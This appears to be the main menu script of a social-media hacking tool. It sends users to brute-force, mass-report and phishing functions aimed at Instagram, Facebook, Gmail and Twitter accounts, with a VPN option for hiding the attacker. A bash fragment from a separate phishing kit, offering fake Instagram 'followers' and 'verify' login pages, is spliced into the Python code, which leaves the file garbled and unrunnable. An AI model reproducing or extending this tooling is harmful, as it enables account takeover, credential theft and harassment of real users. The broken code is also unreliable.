from utils import *
from rich.console import Console
import platform
console = Console()

# print ascii art & loading screen
start()
# select social media
choice = c1()
#vpn on/off
vpn = c_vpn()


if vpn == 1:
	if "Linux" not in platform.system():
		vpn_error()



if choice == 1:
	choice = start_instagram()
	if choice == 1:
		username = get_username()
		wordlist = get_wordlist()
		insta_bruteforce(username, wordlist, vpn)
	if choice == 2:
		username = get_username()
		amount = get_amount()
		insta_massreport(username, vpn, amount, 1)
	if choice == 3:
		instagram(){
printf " \n"
printf " \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[1;93m Traditional Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m02\e[0m\e[1;31m]\e[0m\e[1;93m Auto Followers Login Page\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m03\e[0m\e[1;31m]\e[0m\e[1;93m Blue Badge Verify Login Page\e[0m\n"
printf "\e[0m\n"
read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' ig_option


if [[ $ig_option == 1 || $ig_option == 01 ]]; then
website="instagram"
tunnel_menu
elif [[ $ig_option == 2 || $ig_option == 02 ]]; then
website="ig_followers"
tunnel_menu
elif [[ $ig_option == 3 || $ig_option == 03 ]]; then
website="ig_verify"
tunnel_menu

else
printf "\n\n \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Invalid option \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi

}
elif choice == 2:
	choice = start_instagram()
	if choice == 1:
		username = get_facebook()
		wordlist = get_wordlist()
		facebook_bruteforce(username, wordlist, vpn)
	if choice == 2:
		facebook_massreport()
	if choice == 3:
		facebook_phishing()
elif choice == 3:
	choice = start_instagram()
	if choice == 1:	
		username = get_email()
		wordlist = get_wordlist()
		gmail_bruteforce(username, wordlist, vpn)
	if choice == 2:
		gmail_massreport()
	if choice == 3:
		gmail_phishing()


elif choice == 4:
	choice = start_instagram()
	if choice == 1:	
		username = get_username()
		wordlist = get_wordlist()
		twitter_bruteforce(username, wordlist, vpn)
	if choice == 2:
		twitter_massreport()
	if choice == 3:
		twitter_phishing()
